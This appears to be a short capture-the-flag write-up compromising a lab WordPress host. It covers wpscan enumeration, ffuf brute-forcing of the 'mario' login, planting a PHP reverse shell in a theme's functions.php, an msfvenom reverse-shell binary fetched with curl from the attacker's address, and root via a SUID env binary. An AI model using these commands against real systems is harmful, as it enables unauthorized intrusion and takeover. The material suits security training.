# Initial scans
* There is only port 80 open
* Dirb reports that there is a wordpress installation on the webserver. We can use WpScan
```
wpscan --url http://172.17.0.2/wordpress/ --enumerate vp,u,vt,tt --verbose
```
* From the output we determine that there's a user named mario. We can attempt to brute force their login. First record the POST request to the /wp-admin endpoint to Burp Suite, then save it out as a request file, then use Ffuf tool to fuzz
```
ffuf -request request.txt -w /usr/share/wordlists/rockyou.txt -request-proto http
```
* We then have the credential pair `mario:love`
# Initial access
* We use these creds to login to the Wordpress app, and use the theme editor to access the PHP code for the twentytwentytwo theme. Let's go ahead and replace the functions.php page with the contents of a PHP reverse shell payload
```
http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/functions.php
```
* we'll use the following msfvenom command to create a reverse shell binary to upload to the target
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=172.17.0.1 LPORT=443 -f elf -o reverse.elf
```
* then upload the file via a webshell
```
curl -O http://172.17.0.1/reverse.elf
chmod %2bx reverse.elf
```
# Privilege escalation
* Once on the box, we can partially upgrade our shell by using the Script command
```
script /dev/null -qc /bin/bash
```
* We find that the Env binary is set as SUID
```
env /bin/bash -p
```
Finis
